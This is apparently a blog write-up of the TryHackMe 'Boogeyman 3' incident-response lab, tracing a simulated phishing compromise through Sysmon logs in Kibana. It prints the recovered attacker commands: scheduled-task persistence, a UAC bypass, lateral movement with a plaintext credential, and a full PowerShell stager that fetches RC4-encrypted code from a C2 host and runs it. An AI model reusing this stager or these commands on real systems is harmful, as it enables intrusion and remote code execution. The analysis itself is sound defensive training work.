<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Boogeyman 3" /><meta name="author" content="Ibrahim" /><meta property="og:locale" content="en" /><meta name="description" content="The Boogeyman emerges from the darkness again." /><meta property="og:description" content="The Boogeyman emerges from the darkness again." /><link rel="canonical" href="/posts/boogeyman-3/" /><meta property="og:url" content="/posts/boogeyman-3/" /><meta property="og:site_name" content="Ibrahim EO." /><meta property="og:image" content="/assets/img/tryhackme/boogeyman3/boogeythum.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-11-07T00:00:00+01:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="/assets/img/tryhackme/boogeyman3/boogeythum.png" /><meta property="twitter:title" content="Boogeyman 3" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@Ibrahim" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Ibrahim"},"dateModified":"2024-11-07T00:00:00+01:00","datePublished":"2024-11-07T00:00:00+01:00","description":"The Boogeyman emerges from the darkness again.","headline":"Boogeyman 3","image":"/assets/img/tryhackme/boogeyman3/boogeythum.png","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/boogeyman-3/"},"url":"/posts/boogeyman-3/"}</script><title>Boogeyman 3 | Ibrahim EO.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ibrahim EO."><meta name="application-name" content="Ibrahim EO."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/elomarii-portfolio.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.27.20/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script async src="https://www.googletagmanager.com/gtag/js?id=G-X4YT79QSQC"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-X4YT79QSQC'); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/whoami">Ibrahim EO.</a></h1><p class="site-subtitle fst-italic mb-0">Information Systems Engineer / InfoSec Enthousiaste</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/projects/" class="nav-link"> <i class="fa-fw fas fa-bars-progress"></i> <span>PROJECTS</span> </a><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-newspaper"></i> <span>BLOG</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fas fa-chess-rook"></i> <span>WHOAMI</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/elomarii" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/ibrahim-el-omari/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="javascript:location.href = 'mailto:' + ['i.ibrahim.elomari','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Boogeyman 3</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Boogeyman 3</h1><p class="post-desc fw-light mb-4">The Boogeyman emerges from the darkness again.</p><div class="post-meta text-muted"> <span> Posted <time data-ts="1730934000" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Nov 7, 2024 </time> </span><div class="d-flex justify-content-between"> <span> By <em> Ibrahim </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1280 words" > <em>7 min</em> read</span></div></div></div></header><div class="content"><p><a href="/assets/img/tryhackme/boogeyman3/boogeybanner.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/boogeybanner.png" alt="banner" loading="lazy"></a></p><blockquote class="prompt-info"><p>Due to the previous attacks of Boogeyman, Quick Logistics LLC hired a managed security service provider to handle its Security Operations Center. Little did they know, the Boogeyman was still lurking and waiting for the right moment to return… Check out Boogeyman series on TryHackMe: <a href="https://tryhackme.com/jr/boogeyman1">Boogeyman 1</a> , <a href="https://tryhackme.com/jr/boogeyman2">Boogeyman 2</a> , and <a href="https://tryhackme.com/jr/boogeyman3">Boogeyman 3</a>.</p></blockquote><p>Story time:</p><blockquote><p>Without tripping any security defences of Quick Logistics LLC, the Boogeyman was able to compromise one of the employees and stayed in the dark, waiting for the right moment to continue the attack. Using this initial email access, the threat actors attempted to expand the impact by targeting the CEO, Evan Hutchinson. The email appeared questionable, but Evan still opened the attachment despite the scepticism. After opening the attached document and seeing that nothing happened, Evan reported the phishing email to the security team.</p><p>Upon receiving the phishing email report, the security team investigated the workstation of the CEO. During this activity, the team discovered the email attachment in the downloads folder of the victim. In addition, the security team also observed a file inside the ISO payload</p><p>Lastly, it was presumed by the security team that the incident occurred between August 29 and August 30, 2023. Given the initial findings, you are tasked to analyse and assess the impact of the compromise.</p></blockquote><p><a href="/assets/img/tryhackme/boogeyman3/phishmail.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/phishmail.png" alt="whalmail" loading="lazy"></a></p><p><a href="/assets/img/tryhackme/boogeyman3/iso.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/iso.png" alt="malicious file" loading="lazy"></a></p><p><a href="/assets/img/tryhackme/boogeyman3/htmlpayload.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/htmlpayload.png" alt="payload" loading="lazy"></a></p><p>In this investigation we will be leveraging Kibana to assess the impact of the recent Boogeyman’s attack.</p><p>Once in the home page, head over to Discover tab under Kibana Analytics section and make sure to select the right time periode of the incident.</p><p><a href="/assets/img/tryhackme/boogeyman3/image.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image.png" alt="alt text" loading="lazy"></a></p><p><a href="/assets/img/tryhackme/boogeyman3/image-1.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-1.png" alt="alt text" loading="lazy"></a></p><p>Our investigation will be based on events recorded with Sysmon. We will focus first on executed/created processes (Sysmon EventId 1) and see what we can find out. The first process we see is already very promising. It is most likely to be a ransomware, based on its name <code class="language-plaintext highlighter-rouge">ransomboogey.exe</code>.</p><p><a href="/assets/img/tryhackme/boogeyman3/image-2.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-2.png" alt="alt text" loading="lazy"></a></p><p>Good enough, but let’s not get ahead of ourselves and start from the actual beginning (newest events are displayed on the top). Viewing events in chronological order (oldest first) and querying for events with the keyword “Financial” as in name of the malicious attachment shows us 4 events. The first event refers to the execution of <code class="language-plaintext highlighter-rouge">mshta.exe</code> (PID <kbd>6392</kbd>) spawned by <code class="language-plaintext highlighter-rouge">explorer.exe</code>, and the rest of the events are child processes of <code class="language-plaintext highlighter-rouge">mshta.exe</code>.</p><p><a href="/assets/img/tryhackme/boogeyman3/image-3.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-3.png" alt="alt text" loading="lazy"></a></p><p><code class="language-plaintext highlighter-rouge">mshta.exe</code> is a utility that executes Microsoft HTML Applications (HTA) files, this corresponds to the malicious file filetype masquerading as PDF. The execution of this first stage of the payload resulted in:</p><ol><li>(PID 6204) Implanting the file <code class="language-plaintext highlighter-rouge">review.dat</code> from the mounted drive into the CEO user space<div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\Windows\System32\xcopy.exe</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/e</span><span class="w"> </span><span class="nx">/h</span><span class="w"> </span><span class="nx">D:\review.dat</span><span class="w"> </span><span class="nx">C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat</span><span class="w">
</span></pre></table></code></div></div><li>(PID 3832) Executing a DLL function from the implanted <code class="language-plaintext highlighter-rouge">.dat</code> rogue file (which is actually DLL file)<div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\Windows\System32\rundll32.exe</span><span class="w"> </span><span class="nx">D:\review.dat</span><span class="p">,</span><span class="nx">DllRegisterServer</span><span class="w">
</span></pre></table></code></div></div><li>(PID 3680) Establishing persistence via the new scheduled task named <kbd>Review</kbd><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="s2">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"</span><span class="w"> </span><span class="nv">$A</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskAction</span><span class="w"> </span><span class="nt">-Execute</span><span class="w"> </span><span class="s1">'rundll32.exe'</span><span class="w"> </span><span class="nt">-Argument</span><span class="w"> </span><span class="s1">'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'</span><span class="p">;</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskTrigger</span><span class="w"> </span><span class="nt">-Daily</span><span class="w"> </span><span class="nt">-At</span><span class="w"> </span><span class="nx">06:00</span><span class="p">;</span><span class="w"> </span><span class="nv">$S</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskSettingsSet</span><span class="p">;</span><span class="w"> </span><span class="nv">$P</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskPrincipal</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">username</span><span class="p">;</span><span class="w"> </span><span class="nv">$D</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTask</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nv">$A</span><span class="w"> </span><span class="nt">-Trigger</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="nt">-Principal</span><span class="w"> </span><span class="nv">$P</span><span class="w"> </span><span class="nt">-Settings</span><span class="w"> </span><span class="nv">$S</span><span class="p">;</span><span class="w"> </span><span class="n">Register-ScheduledTask</span><span class="w"> </span><span class="nx">Review</span><span class="w"> </span><span class="nt">-InputObject</span><span class="w"> </span><span class="nv">$D</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w">
</span></pre></table></code></div></div></ol><p>Continuing our investigation by following the traces of step 2 (PID 3832), the screenshot below lists other processes called upon execution of that process. The list of the executed commands is listed right after.</p><p><a href="/assets/img/tryhackme/boogeyman3/image-5.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-5.png" alt="alt text" loading="lazy"></a></p><div file="PID 3680 - Executed commands" class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="PID 3680 - Executed commands"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">C:\Windows\system32\cmd.exe</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s2">"whoami /all"</span><span class="w">
</span><span class="n">C:\Windows\system32\net.exe</span><span class="w"> </span><span class="nx">users</span><span class="w">
</span><span class="n">C:\Windows\system32\net.exe</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w">
</span><span class="n">C:\Windows\system32\whoami.exe</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
</span><span class="n">C:\Windows\system32\fodhelper.exe</span><span class="w">
</span><span class="nx">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$credential</span><span class="s2"> = (New-Object PSCredential -ArgumentList ('QUICKLOGISTICS\allan.smith', (ConvertTo-SecureString 'Tr!ckyP@ssw0rd987' -AsPlainText -Force))) ; Invoke-Command -Credential </span><span class="nv">$credential</span><span class="s2"> -ComputerName WKSTN-1327 -ScriptBlock {powershell -enc SQBmACgAJAB...SNIP...kAKQB8AEkARQBYAA==}"</span><span class="w">
</span></pre></table></code></div></div><p>Commands from line 1 to 4 enumerate the machine’s system, gathering information about users and groups especially administrators. The command in line 5, since it was executed by the malicious document, uses a common exploitation of <kbd>fodhelper.exe</kbd> to bypass UAC. As a quick refresher, User Account Control is a mechanism to safeguard privilege elevation, in simple terms validating a user (in this case an admin) has the right to execute high-privilege actions. <code class="language-plaintext highlighter-rouge">fodhelper.exe</code> on the other hand is a legitimate Windows executable associated with managing optional Windows features. It runs with elevated privileges, which makes it a target for exploitation.</p><p>Boogeyman downloaded a tool from Github to dump credentials. Looking for Github access, we find the tool being used. Should have guessed it, <kbd>mimikatz</kbd>.</p><p><a href="/assets/img/tryhackme/boogeyman3/image-6.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-6.png" alt="alt text" loading="lazy"></a></p><p>What credentials were accessed by the Boogey? Let’s see. Filtering for mimikatz, on machine WKST-0051, we notice that the adversary uses the module <code class="language-plaintext highlighter-rouge">sekurlsa</code> to impersonate users by providing only the hashes of their passwords, the case in the following screenshot with <kbd>itadmin:F84769D250EB95EB2D7D8B4A1C5613F2</kbd>.</p><p><a href="/assets/img/tryhackme/boogeyman3/image copy.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image copy.png" alt="alt text" loading="lazy"></a></p><p>To find out how the attacker found the credentials of <code class="language-plaintext highlighter-rouge">allan.smith</code>, I Looked up some help as I didn’t have an idea of what tool could be used for this purpose. The fact is that Boogeyman downloaded and enumeration tool from Github and used it to discover file shares (local and remote). He then accessed the file <kbd>IT_Automation.ps1</kbd> which happens to contain creds of Allan.</p><p><a href="/assets/img/tryhackme/boogeyman3/image-5 copy.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-5 copy.png" alt="alt text" loading="lazy"></a></p><p><a href="/assets/img/tryhackme/boogeyman3/image-4 copy.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-4 copy.png" alt="alt text" loading="lazy"></a></p><p>Back to <code class="language-plaintext highlighter-rouge">review.dat</code> DLL. The last command on the list tries to execute, remotely on machine <code class="language-plaintext highlighter-rouge">WKSTN-1327</code>, an encoded PowerShell script block as the user <code class="language-plaintext highlighter-rouge">allan.smith</code>. Below is the content of that script. Note, the server value is decoded to <code class="language-plaintext highlighter-rouge">http://cdn.bananapeelparty.net:80</code>. As far as we can understand from the script, this establishes an RC4-encrypted C2 channel with the previously mentionned server.</p><div file="beautified-payload.ps1" class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="beautified-payload.ps1"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="kr">If</span><span class="w"> </span><span class="p">(</span><span class="bp">$PSVersionTable</span><span class="o">.</span><span class="nf">PSVersion</span><span class="o">.</span><span class="nf">Major</span><span class="w"> </span><span class="o">-ge</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="p">[</span><span class="n">System.Net.ServicePointManager</span><span class="p">]::</span><span class="n">Expect100Continue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">

</span><span class="nv">$wc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="w">
</span><span class="nv">$userAgent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span><span class="w">
</span><span class="nv">$wc</span><span class="o">.</span><span class="nf">Headers</span><span class="o">.</span><span class="nf">Add</span><span class="p">(</span><span class="s1">'User-Agent'</span><span class="p">,</span><span class="w"> </span><span class="nv">$userAgent</span><span class="p">)</span><span class="w">
</span><span class="nv">$server</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="w">
    </span><span class="s1">'aAB0AHQAcAA6AC8ALwBjAGQAbgAuAGIAYQBuAGEAbgBhAHAAZQBlAGwAcABhAHIAdAB5AC4AbgBlAHQAOgA4ADAA'</span><span class="w">
</span><span class="p">))</span><span class="w">
</span><span class="nv">$path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'/admin/get.php'</span><span class="w">

</span><span class="nv">$wc</span><span class="o">.</span><span class="nf">Proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Net.WebRequest</span><span class="p">]::</span><span class="n">DefaultWebProxy</span><span class="w">
</span><span class="nv">$wc</span><span class="o">.</span><span class="nf">Proxy</span><span class="o">.</span><span class="nf">Credentials</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Net.CredentialCache</span><span class="p">]::</span><span class="n">DefaultNetworkCredentials</span><span class="w">
</span><span class="nv">$</span><span class="nn">Script</span><span class="p">:</span><span class="nv">Proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$wc</span><span class="o">.</span><span class="nf">Proxy</span><span class="w">

</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">ASCII.GetBytes</span><span class="p">(</span><span class="s1">'}wS1&amp;VNqoIY*G#5-Plv{p2f=4Z?uat@&lt;'</span><span class="p">)</span><span class="w">
</span><span class="nv">$RC4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">param</span><span class="w"> </span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="w"> </span><span class="nv">$key</span><span class="p">)</span><span class="w">
    </span><span class="nv">$S</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">255</span><span class="w">
    </span><span class="nv">$j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
    </span><span class="kr">for</span><span class="w"> </span><span class="p">(</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">256</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nv">$j</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nv">$key</span><span class="o">.</span><span class="nf">Length</span><span class="p">])</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">256</span><span class="w">
        </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span><span class="w"> </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">],</span><span class="w"> </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
    </span><span class="nv">$j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
    </span><span class="nv">$data</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nv">$i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">256</span><span class="w">
        </span><span class="nv">$j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nv">$j</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">256</span><span class="w">
        </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span><span class="w"> </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">],</span><span class="w"> </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w">
        </span><span class="bp">$_</span><span class="w"> </span><span class="o">-bxor</span><span class="w"> </span><span class="nv">$S</span><span class="p">[(</span><span class="nv">$S</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$S</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">256</span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="nv">$wc</span><span class="o">.</span><span class="nf">Headers</span><span class="o">.</span><span class="nf">Add</span><span class="p">(</span><span class="s2">"Cookie"</span><span class="p">,</span><span class="w"> </span><span class="s2">"rlkHVXWbb=13cfco9rUXx0i4J3xTu682JFiX0="</span><span class="p">)</span><span class="w">

</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$wc</span><span class="o">.</span><span class="nf">DownloadData</span><span class="p">(</span><span class="nv">$server</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$path</span><span class="p">)</span><span class="w">

</span><span class="nv">$iv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="mi">3</span><span class="p">]</span><span class="w">
</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$data</span><span class="p">[</span><span class="mi">4</span><span class="o">..</span><span class="nv">$data</span><span class="o">.</span><span class="nf">Length</span><span class="p">]</span><span class="w">
</span><span class="o">-join</span><span class="w"> </span><span class="p">[</span><span class="n">Char</span><span class="p">[]](</span><span class="o">&amp;</span><span class="w"> </span><span class="nv">$RC4</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="p">(</span><span class="nv">$iv</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$key</span><span class="p">))</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Invoke-Expression</span><span class="w">
</span></pre></table></code></div></div><p>Based on the gathered info so far, we can trace connections to the C2 server. Filtering for network events (Sysmon EventId 3) and connections over port 80, there is only one IP address responsible for all the traffic; <kbd>165.232.170.151</kbd>. Hence, it must be the C2 address.</p><p><a href="/assets/img/tryhackme/boogeyman3/image-4.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-4.png" alt="alt text" loading="lazy"></a></p><p>The lateral movement command was executed at <code class="language-plaintext highlighter-rouge">2023-08-30 01:40:37.178</code>. Based on that timestamp, checking <code class="language-plaintext highlighter-rouge">allan.smith</code>’s activity on <code class="language-plaintext highlighter-rouge">WKSTN-1327</code> indicates that the parent process is <kbd>wsmprovhost.exe</kbd>.</p><p><a href="/assets/img/tryhackme/boogeyman3/image-1 copy.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-1 copy.png" alt="alt text" loading="lazy"></a></p><p>On the second machine, Boogeyman used the same procedure to dump credentials. Hence the same trick will show us the accessed credentials of the administrator. <kbd>administrator:00f80f2538dcb54e7adc715c0e7091ec</kbd>.</p><p>A DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.</p><p>Boogey leveraged <code class="language-plaintext highlighter-rouge">mimikatz</code> again to conduct that attack. The evidences left shows an access to <kbd>backupdata</kbd> account.</p><p><a href="/assets/img/tryhackme/boogeyman3/image-2 copy.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-2 copy.png" alt="alt text" loading="lazy"></a></p><p>Now, remember <code class="language-plaintext highlighter-rouge">ransomboogey</code> from the very beginning? The last piece of the puzzle is to identify from where it was downloaded. This info is easily accessible with a simple search for ransomboogey: <kbd>http://ff.sillytechninja.io/ransomboogey.exe</kbd>.</p><p><a href="/assets/img/tryhackme/boogeyman3/image-3 copy.png" class="popup img-link shimmer"><img src="/assets/img/tryhackme/boogeyman3/image-3 copy.png" alt="alt text" loading="lazy"></a></p><p>It is legitimate to hope the Boogeyman does not come back again. But this is an uncontrollable factor. What is controllable however, is to level up the company’s security posture.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw 